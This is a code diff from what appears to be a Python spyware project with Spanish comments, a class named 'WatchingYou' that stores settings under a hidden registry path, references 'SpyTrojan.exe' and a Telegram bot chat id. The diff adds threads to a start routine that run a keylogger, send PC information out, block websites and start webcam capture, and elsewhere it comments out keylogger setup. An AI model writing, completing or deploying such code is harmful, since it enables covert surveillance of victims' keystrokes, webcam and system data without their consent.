@@ -772,7 +772,7 @@ class WatchingYou:
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').set_value_String('fullname', fullname)
         WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').set_value_MultiString('id',chat_id)
     def write_reg_complete_init(self):
-
+        """
         WriteReg().Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
                   active=1,
                   limit=150
@@ -795,26 +795,13 @@ class WatchingYou:
                         name_software='SpyTrojan.exe',
                         username=str(os.getlogin())
                         )
-
+        """
     def active(self):
-        WriteReg().
+        #WriteReg().
+        pass
 
     def desactive(self):
         pass
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -854,17 +841,6 @@ if __name__ == '__main__':
         print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
 
 
-
-        """
-        threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
-        threading.Thread(target=WebsiteBlock().reset()).start() if Util().is_admin() else False  # Desbloquear Webs
-        print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
-        threading.Thread(target=StartUp().infinite).start()
-        threading.Thread(target=PCInformation().send).start()
-        threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-
-        WebCam_IA().start()
-        """
         print("Está en linea")
         return True
 
@@ -872,16 +848,35 @@ if __name__ == '__main__':
     def stop___(): # Detiene todo el proceso
 
         print('se detuvo')
+        # Modificar registro
         return ""
 
     @eel.expose
     def start___():  # Inicia todo el proceso
         print('continuar')
+
+
+        threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
+        threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
+        print("PATH Screenshot: " )
+        threading.Thread(target=PCInformation().send).start()
+        threading.Thread(target=Keylogger().listen_key).start()
+
+        WebCam_IA().start()
+
+
+
+        # Crea Registros
+        # Modificar Registro
+
         return ""
 
     @eel.expose
     def exit___(self):  # Inicia todo el proceso
         #eel._shutdown
+        # Detiene servicio
+        # Cierra software
+
         os._exit(1)
         return ""
 
